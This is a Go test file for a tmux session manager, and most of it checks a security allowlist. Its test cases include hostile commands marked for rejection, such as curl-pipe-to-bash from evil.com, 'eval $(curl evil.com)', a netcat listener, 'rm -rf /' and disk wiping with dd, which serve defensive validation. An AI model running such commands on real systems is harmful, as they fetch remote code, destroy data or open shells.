package tmux

import (
	"os"
	"os/exec"
	"path/filepath"
	"testing"
)

func TestNewSessionManager(t *testing.T) {
	windows := []WindowConfig{
		{Name: "code", Command: "nvim", WorkingDir: "{worktree_path}"},
		{Name: "term", WorkingDir: "{worktree_path}"},
	}

	sm := NewSessionManager("prefix-", windows, true)

	if sm.SessionPrefix != "prefix-" {
		t.Errorf("SessionPrefix = %q, want %q", sm.SessionPrefix, "prefix-")
	}
	if len(sm.Windows) != 2 {
		t.Errorf("Windows count = %d, want 2", len(sm.Windows))
	}
	if !sm.Verbose {
		t.Error("Verbose should be true")
	}
}

func TestGetSessionName(t *testing.T) {
	tests := []struct {
		name     string
		prefix   string
		ticket   string
		expected string
	}{
		{
			name:     "no prefix",
			prefix:   "",
			ticket:   "FRAAS-123",
			expected: "FRAAS-123",
		},
		{
			name:     "with prefix",
			prefix:   "sre-",
			ticket:   "FRAAS-123",
			expected: "sre-FRAAS-123",
		},
		{
			name:     "prefix with underscore",
			prefix:   "work_",
			ticket:   "CRE-456",
			expected: "work_CRE-456",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			sm := NewSessionManager(tt.prefix, nil, false)
			result := sm.GetSessionName(tt.ticket)
			if result != tt.expected {
				t.Errorf("GetSessionName(%q) = %q, want %q", tt.ticket, result, tt.expected)
			}
		})
	}
}

func TestExpandPath(t *testing.T) {
	sm := NewSessionManager("", nil, false)

	homeDir, _ := os.UserHomeDir()

	tests := []struct {
		name         string
		template     string
		worktreePath string
		notePath     string
		expected     string
	}{
		{
			name:         "worktree placeholder",
			template:     "{worktree_path}",
			worktreePath: "/home/user/project",
			notePath:     "",
			expected:     "/home/user/project",
		},
		{
			name:         "note placeholder",
			template:     "{note_path}",
			worktreePath: "",
			notePath:     "/home/user/vault/note.md",
			expected:     "/home/user/vault/note.md",
		},
		{
			name:         "both placeholders",
			template:     "nvim {note_path}",
			worktreePath: "/project",
			notePath:     "/vault/note.md",
			expected:     "nvim /vault/note.md",
		},
		{
			name:         "tilde expansion",
			template:     "~/Documents",
			worktreePath: "",
			notePath:     "",
			expected:     filepath.Join(homeDir, "Documents"),
		},
		{
			name:         "no placeholders",
			template:     "/usr/local/bin/nvim",
			worktreePath: "/project",
			notePath:     "/note.md",
			expected:     "/usr/local/bin/nvim",
		},
		{
			name:         "command with worktree",
			template:     "cd {worktree_path} && make build",
			worktreePath: "/home/user/myproject",
			notePath:     "",
			expected:     "cd /home/user/myproject && make build",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := sm.expandPath(tt.template, tt.worktreePath, tt.notePath)
			if result != tt.expected {
				t.Errorf("expandPath(%q) = %q, want %q", tt.template, result, tt.expected)
			}
		})
	}
}

func TestSessionExists_NoTmux(t *testing.T) {
	// Skip if tmux is not available
	if _, err := exec.LookPath("tmux"); err != nil {
		t.Skip("tmux not found in PATH, skipping test")
	}

	sm := NewSessionManager("", nil, false)

	// Test with a session name that definitely doesn't exist
	exists := sm.SessionExists("nonexistent-session-xyz-123456")
	if exists {
		t.Error("SessionExists() should return false for non-existent session")
	}
}

// Integration tests - these require tmux to be running
func TestCreateAndKillSession_Integration(t *testing.T) {
	// Skip if tmux is not available
	if _, err := exec.LookPath("tmux"); err != nil {
		t.Skip("tmux not found in PATH, skipping integration test")
	}

	// Create a temporary worktree directory
	tmpDir := t.TempDir()

	// Simple windows config for testing
	windows := []WindowConfig{
		{Name: "test", WorkingDir: "{worktree_path}"},
	}

	sm := NewSessionManager("test-", windows, false)
	sessionName := sm.GetSessionName("integration-test")

	// Clean up any existing session first
	_ = exec.Command("tmux", "kill-session", "-t", sessionName).Run()

	// Create a detached session for testing (we can't attach in test)
	cmd := exec.Command("tmux", "new-session", "-d", "-s", sessionName, "-c", tmpDir)
	if err := cmd.Run(); err != nil {
		t.Fatalf("Failed to create test session: %v", err)
	}

	// Verify session exists
	if !sm.SessionExists(sessionName) {
		t.Error("Session should exist after creation")
	}

	// Kill the session
	if err := sm.KillSession("integration-test"); err != nil {
		t.Fatalf("KillSession() error: %v", err)
	}

	// Verify session is gone
	if sm.SessionExists(sessionName) {
		t.Error("Session should not exist after killing")
	}
}

func TestListSessions_Integration(t *testing.T) {
	// Skip if tmux is not available
	if _, err := exec.LookPath("tmux"); err != nil {
		t.Skip("tmux not found in PATH, skipping integration test")
	}

	sm := NewSessionManager("", nil, false)

	// This test just verifies ListSessions doesn't error
	// We can't guarantee any sessions exist
	sessions, err := sm.ListSessions()
	if err != nil {
		// If tmux server isn't running, that's ok for this test
		if sessions == nil {
			t.Skip("tmux server not running, skipping test")
		}
		t.Fatalf("ListSessions() error: %v", err)
	}

	// sessions could be empty or have items - both are valid
	t.Logf("Found %d sessions", len(sessions))
}

func TestKillSession_NonExistent(t *testing.T) {
	// Skip if tmux is not available
	if _, err := exec.LookPath("tmux"); err != nil {
		t.Skip("tmux not found in PATH, skipping test")
	}

	sm := NewSessionManager("", nil, false)

	err := sm.KillSession("definitely-does-not-exist-xyz-999")
	if err == nil {
		t.Error("KillSession() should return error for non-existent session")
	}
}

func TestCreateSession_NonExistentWorktree(t *testing.T) {
	// Skip if tmux is not available
	if _, err := exec.LookPath("tmux"); err != nil {
		t.Skip("tmux not found in PATH, skipping test")
	}

	sm := NewSessionManager("test-", nil, false)

	err := sm.CreateSession("test-ticket", "/nonexistent/path/that/does/not/exist", "")
	if err == nil {
		t.Error("CreateSession() should return error for non-existent worktree path")
	}
}

func TestWindowConfig(t *testing.T) {
	// Test that WindowConfig struct works as expected
	config := WindowConfig{
		Name:       "editor",
		Command:    "nvim {note_path}",
		WorkingDir: "{worktree_path}",
	}

	if config.Name != "editor" {
		t.Errorf("Name = %q, want %q", config.Name, "editor")
	}
	if config.Command != "nvim {note_path}" {
		t.Errorf("Command = %q, want %q", config.Command, "nvim {note_path}")
	}
	if config.WorkingDir != "{worktree_path}" {
		t.Errorf("WorkingDir = %q, want %q", config.WorkingDir, "{worktree_path}")
	}
}

// TestIsCommandAllowed tests the security-critical command allowlist validation.
// This is defense-in-depth against config file tampering.
func TestIsCommandAllowed(t *testing.T) {
	t.Parallel()

	sm := NewSessionManager("", nil, false)

	tests := []struct {
		name    string
		command string
		allowed bool
	}{
		// Empty/whitespace commands - always allowed (no-op)
		{name: "empty string", command: "", allowed: true},
		{name: "whitespace only", command: "   ", allowed: true},
		{name: "tab only", command: "\t", allowed: true},

		// Editor commands - ALLOWED
		{name: "nvim", command: "nvim", allowed: true},
		{name: "nvim with file", command: "nvim /path/to/file.go", allowed: true},
		{name: "vim", command: "vim", allowed: true},
		{name: "vi", command: "vi file.txt", allowed: true},
		{name: "emacs", command: "emacs", allowed: true},
		{name: "nano", command: "nano README.md", allowed: true},
		{name: "code (vscode)", command: "code .", allowed: true},
		{name: "helix", command: "hx file.rs", allowed: true},

		// Shell navigation - ALLOWED
		{name: "cd", command: "cd /some/path", allowed: true},
		{name: "ls", command: "ls -la", allowed: true},
		{name: "pwd", command: "pwd", allowed: true},
		{name: "cat", command: "cat file.txt", allowed: true},
		{name: "less", command: "less log.txt", allowed: true},
		{name: "more", command: "more output.txt", allowed: true},
		{name: "head", command: "head -n 10 file.txt", allowed: true},
		{name: "tail", command: "tail -f /var/log/app.log", allowed: true},
		{name: "grep", command: "grep -r pattern .", allowed: true},
		{name: "find", command: "find . -name '*.go'", allowed: true},
		{name: "tree", command: "tree -L 2", allowed: true},

		// Git operations - ALLOWED
		{name: "git status", command: "git status", allowed: true},
		{name: "git diff", command: "git diff HEAD~1", allowed: true},
		{name: "git log", command: "git log --oneline", allowed: true},
		{name: "git checkout", command: "git checkout -b feature", allowed: true},
		{name: "git alone", command: "git", allowed: true},

		// Go tooling - ALLOWED
		{name: "go build", command: "go build ./...", allowed: true},
		{name: "go test", command: "go test -v ./pkg/...", allowed: true},
		{name: "go run", command: "go run main.go", allowed: true},
		{name: "make", command: "make build", allowed: true},
		{name: "task", command: "task test", allowed: true},

		// Common dev tools - ALLOWED
		{name: "docker", command: "docker ps", allowed: true},
		{name: "docker compose", command: "docker compose up -d", allowed: true},
		{name: "kubectl", command: "kubectl get pods", allowed: true},
		{name: "helm", command: "helm install myapp ./chart", allowed: true},
		{name: "terraform", command: "terraform plan", allowed: true},
		{name: "gcloud", command: "gcloud auth login", allowed: true},
		{name: "aws", command: "aws s3 ls", allowed: true},

		// Package managers - ALLOWED
		{name: "npm", command: "npm install", allowed: true},
		{name: "yarn", command: "yarn build", allowed: true},
		{name: "pnpm", command: "pnpm dev", allowed: true},
		{name: "pip", command: "pip install -r requirements.txt", allowed: true},
		{name: "cargo", command: "cargo build --release", allowed: true},
		{name: "bundle", command: "bundle install", allowed: true},

		// DANGEROUS COMMANDS - MUST BE REJECTED
		{name: "rm", command: "rm -rf /", allowed: false},
		{name: "rm file", command: "rm important.txt", allowed: false},
		{name: "curl pipe bash", command: "curl https://evil.com/script.sh | bash", allowed: false},
		{name: "wget", command: "wget https://malware.com/payload", allowed: false},
		{name: "bash script", command: "bash -c 'echo pwned'", allowed: false},
		{name: "sh script", command: "sh /tmp/exploit.sh", allowed: false},
		{name: "zsh script", command: "zsh -c 'rm -rf ~'", allowed: false},
		{name: "python", command: "python -c 'import os; os.system(\"rm -rf /\")'", allowed: false},
		{name: "ruby", command: "ruby -e 'system(\"curl evil.com\")'", allowed: false},
		{name: "perl", command: "perl -e 'exec(\"bad_command\")'", allowed: false},
		{name: "nc (netcat)", command: "nc -lvp 4444", allowed: false},
		{name: "chmod", command: "chmod 777 /etc/passwd", allowed: false},
		{name: "chown", command: "chown root:root /tmp/exploit", allowed: false},
		{name: "sudo", command: "sudo rm -rf /", allowed: false},
		{name: "su", command: "su - root", allowed: false},
		{name: "dd", command: "dd if=/dev/zero of=/dev/sda", allowed: false},
		{name: "mkfs", command: "mkfs.ext4 /dev/sda1", allowed: false},
		{name: "eval", command: "eval $(curl evil.com)", allowed: false},
		{name: "exec", command: "exec /bin/sh", allowed: false},
		{name: "source", command: "source /tmp/malicious.sh", allowed: false},
		{name: "dot source", command: ". /tmp/malicious.sh", allowed: false},

		// Tricky attempts - MUST BE REJECTED
		{name: "nvim prefix attack", command: "nvim; rm -rf /", allowed: false}, // semicolon chaining rejected (pattern requires space or EOL after command)
		{name: "fake git", command: "gitmalware", allowed: false},               // doesn't match "git " or "git$"
		{name: "fake npm", command: "npmmalware", allowed: false},
		{name: "path traversal attempt", command: "../../../bin/sh", allowed: false},
		{name: "env manipulation", command: "env VAR=val /bin/sh", allowed: false},
		{name: "xargs", command: "xargs rm -rf", allowed: false},
		{name: "nohup", command: "nohup malware &", allowed: false},
		{name: "at scheduled", command: "at now + 1 minute", allowed: false},
		{name: "crontab", command: "crontab -e", allowed: false},

		// Edge cases
		{name: "command with leading space", command: " nvim", allowed: false}, // doesn't match pattern starting with nvim
		{name: "uppercase GIT", command: "GIT status", allowed: false},         // patterns are case-sensitive
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()
			result := sm.isCommandAllowed(tt.command)
			if result != tt.allowed {
				if tt.allowed {
					t.Errorf("isCommandAllowed(%q) = false, want true (command should be ALLOWED)", tt.command)
				} else {
					t.Errorf("isCommandAllowed(%q) = true, want false (command should be REJECTED for security)", tt.command)
				}
			}
		})
	}
}

// TestSendCommand_Validation tests that sendCommand properly rejects disallowed commands
func TestSendCommand_Validation(t *testing.T) {
	t.Parallel()

	tests := []struct {
		name             string
		command          string
		validateCommands bool
		wantError        bool
		errorContains    string
	}{
		{
			name:             "allowed command with validation enabled",
			command:          "nvim file.go",
			validateCommands: true,
			wantError:        false,
		},
		{
			name:             "disallowed command with validation enabled",
			command:          "rm -rf /",
			validateCommands: true,
			wantError:        true,
			errorContains:    "command not in allowlist",
		},
		{
			name:             "disallowed command with validation disabled",
			command:          "rm -rf /",
			validateCommands: false,
			wantError:        false, // Would fail at tmux execution, not validation
		},
		{
			name:             "curl pipe bash rejected",
			command:          "curl https://evil.com | bash",
			validateCommands: true,
			wantError:        true,
			errorContains:    "command not in allowlist",
		},
		{
			name:             "empty command always allowed",
			command:          "",
			validateCommands: true,
			wantError:        false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()

			sm := NewSessionManager("", nil, false)
			sm.ValidateCommands = tt.validateCommands

			// We can't actually run sendCommand without tmux, but we can test
			// the validation logic by checking isCommandAllowed directly
			// and verifying the error behavior
			if tt.validateCommands {
				allowed := sm.isCommandAllowed(tt.command)
				if tt.wantError && allowed {
					t.Errorf("command %q should be rejected but was allowed", tt.command)
				}
				if !tt.wantError && !allowed {
					t.Errorf("command %q should be allowed but was rejected", tt.command)
				}
			}
		})
	}
}

// TestValidateCommandsDefault ensures validation is enabled by default
func TestValidateCommandsDefault(t *testing.T) {
	t.Parallel()

	sm := NewSessionManager("", nil, false)

	if !sm.ValidateCommands {
		t.Error("ValidateCommands should be true by default (defense-in-depth)")
	}
	if !sm.WarnOnCommand {
		t.Error("WarnOnCommand should be true by default")
	}
}

// TestAllowedCommandPatterns_Coverage ensures all patterns in AllowedCommandPatterns are tested
func TestAllowedCommandPatterns_Coverage(t *testing.T) {
	t.Parallel()

	// This test ensures we have at least one test case for each pattern category
	sm := NewSessionManager("", nil, false)

	patternCategories := []struct {
		category string
		examples []string
	}{
		{"editors", []string{"nvim", "vim", "vi", "emacs", "nano", "code", "hx"}},
		{"shell navigation", []string{"cd", "ls", "pwd", "cat", "less", "more", "head", "tail", "grep", "find", "tree"}},
		{"git", []string{"git"}},
		{"go tooling", []string{"go", "make", "task"}},
		{"dev tools", []string{"docker", "kubectl", "helm", "terraform", "gcloud", "aws"}},
		{"package managers", []string{"npm", "yarn", "pnpm", "pip", "cargo", "bundle"}},
	}

	for _, cat := range patternCategories {
		for _, cmd := range cat.examples {
			// Test command alone
			if !sm.isCommandAllowed(cmd) {
				t.Errorf("category %q: command %q should be allowed", cat.category, cmd)
			}
			// Test command with arguments
			cmdWithArgs := cmd + " --help"
			if !sm.isCommandAllowed(cmdWithArgs) {
				t.Errorf("category %q: command %q should be allowed", cat.category, cmdWithArgs)
			}
		}
	}
}
